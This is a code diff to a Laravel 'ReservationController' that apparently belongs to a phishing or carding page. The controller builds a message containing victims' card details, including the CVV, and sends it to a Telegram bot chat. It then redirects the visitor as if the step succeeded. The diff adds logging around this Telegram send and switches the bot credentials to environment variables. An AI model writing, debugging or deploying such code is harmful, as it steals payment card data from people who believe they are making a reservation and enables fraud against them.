@@ -24,20 +24,25 @@ class ReservationController extends Controller
                 . "🔑 CVV : `{$validated['cvv']}`";
 
         try {
+            \Log::info('ReservationController - Attempting to send Telegram message');
             $this->sendTelegramMessage($message);
+            \Log::info('ReservationController - Message sent successfully');
             return redirect()->route('valider');
         } catch (\Exception $e) {
-            \Log::error('Telegram send error: ' . $e->getMessage());
+            \Log::error('ReservationController Telegram error: ' . $e->getMessage());
             return redirect()->route('valider');
         }
     }
 
     private function sendTelegramMessage($message)
     {
-        $token = config('services.telegram-bot-api.token');
-        $chatId = config('services.telegram-bot-api.chat_id');
+        $token = env('TELEGRAM_BOT_TOKEN');
+        $chatId = env('TELEGRAM_CHAT_ID');
+        
+        \Log::info('ReservationController Telegram config check - Token: ' . ($token ? 'SET' : 'MISSING') . ', ChatId: ' . ($chatId ? 'SET (' . $chatId . ')' : 'MISSING'));
         
         if (!$token || !$chatId) {
+            \Log::error('ReservationController Telegram config missing');
             throw new \Exception('Telegram config missing');
         }
 
@@ -63,11 +68,14 @@ class ReservationController extends Controller
         $error = curl_error($ch);
         curl_close($ch);
 
+        \Log::info('ReservationController Telegram API response - HTTP Code: ' . $httpCode);
+        \Log::info('ReservationController Telegram API response - Body: ' . $response);
+
         if ($httpCode !== 200) {
-            \Log::error('Telegram API error: HTTP ' . $httpCode . ' - ' . $response . ' - ' . $error);
+            \Log::error('ReservationController Telegram API error: HTTP ' . $httpCode . ' - ' . $response . ' - ' . $error);
             throw new \Exception('Telegram API failed: ' . $response);
         }
 
-        \Log::info('Telegram message sent successfully');
+        \Log::info('ReservationController Telegram message sent successfully');
     }
 }
